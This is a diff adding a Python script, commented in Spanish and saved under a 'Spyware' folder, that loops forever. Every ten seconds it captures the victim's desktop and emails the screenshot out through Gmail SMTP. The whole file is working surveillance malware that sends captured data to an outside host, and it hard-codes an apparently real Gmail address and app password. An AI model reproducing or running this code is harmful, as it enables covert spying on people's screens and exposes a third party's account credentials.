@@ -1,0 +1,44 @@
+from email.mime.application import MIMEApplication
+
+smtp_server = 'smtp.gmail.com'
+smtp_port = 587
+smtp_username = 'tgtomy2002@gmail.com'
+smtp_password = 'hmodbsptisvjanwq'
+to = 'recipient_email@example.com'
+
+while True:
+    # Toma una captura de pantalla del escritorio
+    screenshot = pyautogui.screenshot()
+
+    # Guarda la captura de pantalla en una ubicación específica
+    screenshot.save('C:\Spyware\captura_de_pantalla.png')
+
+    # Espera 10 segundos antes de tomar otra captura de pantalla
+    time.sleep(10)
+
+    # Envía un correo electrónico con la captura de pantalla como archivo adjunto
+    subject = 'Captura de pantalla'
+    body = 'Adjunto encontrarás una captura de pantalla del escritorio.'
+    files = ['C:\Spyware\captura_de_pantalla.png']
+
+    msg = MIMEMultipart()
+    msg['From'] = smtp_username
+    msg['To'] = to
+    msg['Subject'] = subject
+
+    msg.attach(MIMEText(body))
+
+    for f in files:
+        with open(f, "rb") as fil:
+            part = MIMEApplication(
+                fil.read(),
+                Name=f
+            )
+            part['Content-Disposition'] = 'attachment; filename="%s"' % f
+            msg.attach(part)
+
+    smtp = smtplib.SMTP(smtp_server, smtp_port)
+    smtp.starttls()
+    smtp.login(smtp_username, smtp_password)
+    smtp.sendmail(smtp_username, to, msg.as_string())
+    smtp.quit()
